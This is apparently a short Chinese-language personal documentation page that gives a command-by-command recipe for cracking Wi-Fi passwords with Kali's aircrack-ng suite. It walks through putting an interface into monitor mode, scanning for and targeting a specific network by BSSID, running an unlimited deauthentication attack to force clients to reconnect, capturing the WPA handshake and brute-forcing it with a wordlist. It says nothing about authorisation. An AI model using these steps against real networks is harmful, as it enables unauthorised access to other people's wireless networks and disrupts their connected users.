---
title: kali_cracking_wifi
date: 2023-01-28 05:25:47
permalink: /pages/da8b7e/
categories:
  - zh copy
  - develop
tags:
  - 
author: 
  name: xugaoyi
  link: https://github.com/xugaoyi
---


## https://www.kali.org/

```shell
sudo -s
airmon-ng start wlan0
#开启监听模式之后，无线接口wlan0就变成了 wlan0mon
airmon-ng start wlan0

ifconfig
#扫描当前环境的 WiFi 网络
airodump-ng wlan0mon
########
#BSSID 为 wifi 的 MAC 地址 (接下来会用到) 
#PWR 为信号强弱程度 数值越小信号越强
#DATA 为数据量
#CH 为信道频率（频道）(接下来会用到)
#ENC 是加密方式
#ESSID 为 wifi 的名称


#监听要破解的wifi
airodump-ng -c 频道 -w 储存数据的文件夹路径 wlan0mon --bssid 监听wifi的mac地址
#airodump-ng -c 11 -w /home/kali/wifi/a wlan0mon --bssid 08:9B:4B:B7:B9:7E

#监听到握手包之后，启动暴力破解
aircrack-ng -w 字典 握手包
#aircrack-ng -w ./wifi.txt ./桌面-02.cap


```

```shell
#另开一个窗口，把连接用户挤下线，再重新连接。上一个监听可以监听到握手包
aireplay-ng -a 监听wifi的mac地址 -c 被踢设备的mac地址|监听wifi的mac地址 --deauth 0 wlan0
#aireplay-ng -a FC:7C:02:9F:0F:9F -c FC:7C:02:9F:0F:9F --deauth 0 wlan0mon
```

